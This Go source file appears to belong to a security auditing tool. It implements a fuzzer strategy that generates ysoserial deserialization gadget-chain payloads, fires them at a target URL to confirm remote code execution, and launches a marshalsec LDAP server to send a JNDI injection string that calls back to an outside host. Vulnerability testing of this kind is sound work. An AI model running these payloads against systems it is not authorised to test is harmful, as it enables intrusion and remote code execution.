package fuzzer

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/joern-audit/joern_audit/internal/config"
)

// DeserStrategy tests for Java deserialization vulnerabilities (CWE-502).
// It uses ysoserial to generate payloads and optionally marshalsec for JNDI attacks.
type DeserStrategy struct {
	cfg *config.FuzzerConfig
}

func NewDeserStrategy(cfg *config.FuzzerConfig) *DeserStrategy {
	return &DeserStrategy{cfg: cfg}
}

func (s *DeserStrategy) Name() string { return "deser" }

func (s *DeserStrategy) CanHandle(cwe string) bool {
	return cwe == "CWE-502"
}

// Common ysoserial gadget chains to try, in order of likelihood.
var gadgetChains = []string{
	"URLDNS",
	"CommonsCollections1",
	"CommonsCollections5",
	"CommonsCollections6",
	"Jdk7u21",
}

func (s *DeserStrategy) GeneratePoC(ctx context.Context, req PoCRequest) (*PoCTemplate, error) {
	parsed := ParseAttackVector(req.AttackVector)
	RefineWithRegistry(parsed, req.Evidence, req.Registry, req.SourceRoot)

	targetURL := BuildTargetURL(req.TargetURL, parsed)

	method := parsed.Method
	if method == "GET" {
		method = "POST"
	}

	ysoPath := s.cfg.YsoserialPath
	if ysoPath == "" {
		ysoPath = "ysoserial"
	}

	headers := map[string]string{
		"Content-Type": "application/x-java-serialized-object",
	}
	for k, v := range parsed.Headers {
		headers[k] = v
	}

	return &PoCTemplate{
		Type:    "deser",
		Command: ysoPath,
		Method:  method,
		URL:     targetURL,
		Headers: headers,
		Payload: fmt.Sprintf("ysoserial gadget chains: %s", strings.Join(gadgetChains, ", ")),
	}, nil
}

func (s *DeserStrategy) Execute(ctx context.Context, poc *PoCTemplate) (*FuzzResult, error) {
	// Phase A: URLDNS detection (safe, DNS-only)
	result := s.tryURDNS(ctx, poc)
	if result.Status == FuzzConfirmed {
		return result, nil
	}

	// Phase B: Try other gadget chains looking for 500 responses
	for _, chain := range gadgetChains {
		if chain == "URLDNS" {
			continue // already tried
		}
		chainResult := s.tryGadgetChain(ctx, poc, chain)
		if chainResult.Status == FuzzConfirmed || chainResult.Status == FuzzPartial {
			return chainResult, nil
		}
	}

	// Phase C: JNDI injection if marshalsec is available
	if s.cfg.MarshalsecPath != "" && s.cfg.CallbackAddr != "" {
		jndiResult := s.tryJNDI(ctx, poc)
		if jndiResult.Status == FuzzConfirmed || jndiResult.Status == FuzzPartial {
			return jndiResult, nil
		}
	}

	return &FuzzResult{
		Status:       FuzzFailed,
		Tool:         "ysoserial",
		PoC:          poc.Payload,
		ResponseDiff: "No deserialization vulnerability detected with available gadget chains",
	}, nil
}

// tryURDNS uses the URLDNS gadget which is safe (only triggers DNS lookup).
func (s *DeserStrategy) tryURDNS(ctx context.Context, poc *PoCTemplate) *FuzzResult {
	result := &FuzzResult{
		Tool: "ysoserial",
		PoC:  "URLDNS",
	}

	callbackURL := "http://urldns-test.localhost"
	if s.cfg.CallbackAddr != "" {
		callbackURL = fmt.Sprintf("http://%s/deser-urldns-test", s.cfg.CallbackAddr)
	}

	// Generate URLDNS payload
	payload, err := s.generateYsoPayload(ctx, "URLDNS", callbackURL)
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("ysoserial URLDNS generation failed: %v", err)
		return result
	}

	// Send payload to target
	statusCode, respBody, err := s.sendPayload(ctx, poc, payload)
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
		return result
	}

	// 500 with deserialization-related error suggests the endpoint processes serialized data
	if statusCode == 500 {
		lower := strings.ToLower(respBody)
		if strings.Contains(lower, "deserial") || strings.Contains(lower, "objectinput") ||
			strings.Contains(lower, "java.io") || strings.Contains(lower, "classnotfound") {
			result.Status = FuzzPartial
			result.ResponseDiff = fmt.Sprintf("URLDNS: server returned 500 with deserialization-related error (status %d)", statusCode)
			return result
		}
		result.Status = FuzzPartial
		result.ResponseDiff = fmt.Sprintf("URLDNS: server returned 500 (may be processing serialized object)")
		return result
	}

	result.Status = FuzzFailed
	result.ResponseDiff = fmt.Sprintf("URLDNS: no deserialization detected (status %d)", statusCode)
	return result
}

// tryGadgetChain tries a specific ysoserial gadget chain.
func (s *DeserStrategy) tryGadgetChain(ctx context.Context, poc *PoCTemplate, chain string) *FuzzResult {
	result := &FuzzResult{
		Tool: "ysoserial",
		PoC:  chain,
	}

	// Generate payload with a benign command
	payload, err := s.generateYsoPayload(ctx, chain, "id")
	if err != nil {
		result.Status = FuzzFailed
		result.Error = fmt.Sprintf("ysoserial %s generation failed: %v", chain, err)
		return result
	}

	statusCode, respBody, err := s.sendPayload(ctx, poc, payload)
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
		return result
	}

	// Check if the command executed
	if strings.Contains(respBody, "uid=") {
		result.Status = FuzzConfirmed
		result.ResponseDiff = fmt.Sprintf("Gadget %s: command output detected in response (uid=)", chain)
		return result
	}

	if statusCode == 500 {
		result.Status = FuzzPartial
		result.ResponseDiff = fmt.Sprintf("Gadget %s: server returned 500 (possible RCE)", chain)
		return result
	}

	result.Status = FuzzFailed
	result.ResponseDiff = fmt.Sprintf("Gadget %s: no effect detected (status %d)", chain, statusCode)
	return result
}

// tryJNDI attempts JNDI injection using marshalsec as an LDAP server.
func (s *DeserStrategy) tryJNDI(ctx context.Context, poc *PoCTemplate) *FuzzResult {
	result := &FuzzResult{
		Tool: "marshalsec",
		PoC:  "JNDI/LDAP",
	}

	// Start marshalsec LDAP server in background
	marshalsecCmd := exec.CommandContext(ctx, "java", "-cp", s.cfg.MarshalsecPath,
		"marshalsec.jndi.LDAPRefServer", fmt.Sprintf("http://%s/#Exploit", s.cfg.CallbackAddr))

	marshalsecCmd.Stdout = nil
	marshalsecCmd.Stderr = nil

	if err := marshalsecCmd.Start(); err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("failed to start marshalsec: %v", err)
		return result
	}

	// Ensure cleanup
	defer func() {
		if marshalsecCmd.Process != nil {
			marshalsecCmd.Process.Kill()
			marshalsecCmd.Wait()
		}
	}()

	// Wait a moment for marshalsec to start
	time.Sleep(2 * time.Second)

	// Send JNDI payload
	jndiPayload := fmt.Sprintf("${jndi:ldap://%s:1389/Exploit}", s.cfg.CallbackAddr)

	timeout := s.cfg.Timeout
	if timeout <= 0 {
		timeout = 120
	}
	client := &http.Client{Timeout: time.Duration(timeout) * time.Second}

	req, err := http.NewRequestWithContext(ctx, poc.Method, poc.URL, strings.NewReader(jndiPayload))
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("create request: %v", err)
		return result
	}
	for k, v := range poc.Headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		result.Status = FuzzError
		result.Error = fmt.Sprintf("HTTP request failed: %v", err)
		return result
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	// Check if marshalsec received a connection (process would still be running)
	// In a real scenario, we'd check marshalsec's stdout for connection logs.
	// For now, a 500 status suggests the JNDI lookup was attempted.
	if resp.StatusCode == 500 {
		result.Status = FuzzPartial
		result.ResponseDiff = "JNDI: server returned 500 (possible JNDI lookup attempted)"
		return result
	}

	result.Status = FuzzFailed
	result.ResponseDiff = fmt.Sprintf("JNDI: no effect detected (status %d)", resp.StatusCode)
	return result
}

// generateYsoPayload runs ysoserial to generate a serialized payload.
func (s *DeserStrategy) generateYsoPayload(ctx context.Context, chain, command string) ([]byte, error) {
	ysoPath := s.cfg.YsoserialPath
	if ysoPath == "" {
		ysoPath = "ysoserial"
	}

	// Check if ysoserial is a .jar file
	args := []string{}
	cmdName := ysoPath
	if strings.HasSuffix(ysoPath, ".jar") {
		cmdName = "java"
		args = []string{"-jar", ysoPath, chain, command}
	} else {
		args = []string{chain, command}
	}

	execResult, err := RunProcess(ctx, cmdName, args, s.cfg.Timeout)
	if err != nil {
		return nil, fmt.Errorf("run ysoserial: %w", err)
	}

	if execResult.ExitCode != 0 {
		return nil, fmt.Errorf("ysoserial exited with code %d: %s", execResult.ExitCode, execResult.Stderr)
	}

	return []byte(execResult.Stdout), nil
}

// sendPayload sends a serialized payload to the target endpoint.
func (s *DeserStrategy) sendPayload(ctx context.Context, poc *PoCTemplate, payload []byte) (int, string, error) {
	timeout := s.cfg.Timeout
	if timeout <= 0 {
		timeout = 120
	}
	client := &http.Client{Timeout: time.Duration(timeout) * time.Second}

	req, err := http.NewRequestWithContext(ctx, poc.Method, poc.URL, strings.NewReader(string(payload)))
	if err != nil {
		return 0, "", err
	}

	for k, v := range poc.Headers {
		req.Header.Set(k, v)
	}

	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, string(bodyBytes), nil
}
